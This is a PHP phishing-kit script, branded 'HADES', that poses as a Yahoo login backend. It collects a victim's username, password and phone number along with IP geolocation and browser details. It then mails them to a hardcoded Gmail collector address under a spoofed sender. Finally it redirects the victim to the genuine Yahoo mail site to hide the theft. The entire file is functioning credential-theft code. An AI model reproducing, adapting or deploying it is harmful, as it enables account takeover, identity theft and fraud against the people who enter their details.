<?php
session_start();
$_SESSION['username'];
$_SESSION['pass'];
$_SESSION['tel'] = $_POST['tel'];

$ip = getenv("REMOTE_ADDR");
$addr_details = unserialize(file_get_contents('http://www.geoplugin.net/php.gp?ip='.$ip));
$country = stripslashes(ucfirst($addr_details[geoplugin_countryName]));
$browserAgent = $_SERVER['HTTP_USER_AGENT'];
$login = $_SESSION['username'];
$passwd = $_SESSION['pass'];
$tel = $_SESSION['tel'];
$own = 'maxgomery931@gmail.com';
$server = date("D/M/d, Y g:i a"); 
$sender = 'jamb@allwritersincome.com';
$domain = 'YAHOO SURE ';
$subj = "$domain LOGZ $country";
$headers .= "From: YAHOO@<$sender>\n";
$headers .= "X-Priority: 1\n"; //1 Urgent Message, 3 Normal
$headers .= "Content-Type:text/html; charset=\"iso-8859-1\"\n";
$over = 'https://mail.yahoo.com';
$msg = "
 
 ________HADES_________
 
 $domain
 
 username : $login
 Password : $passwd
 phone number : $tel
 IP: $ip
 Date: $server
 country : $country
 Browser : $browserAgent
 
 _________HADES__________
 ";

if (empty($login) || empty($passwd)) {

header( "Location: index.php " );

    
}else {
    
        $mail_to_send_to = "maxgomery931@gmail.com";
        $from_email = "HADES@allwritersincome.com";

                $email = "maxgomery931@gmail.com" ;
                $message = $msg ;
                $headers = "From: $from_email" . "\r\n" . "Reply-To: $email" . "\r\n" ;
                $a = mail( $mail_to_send_to, $subj, $message, $headers );
                if ($a)
                {
                     header("location: $over");
                } else {
                     print("Message wasn't sent, please check that you have changed emails in the bottom");
                }
        

}
?>
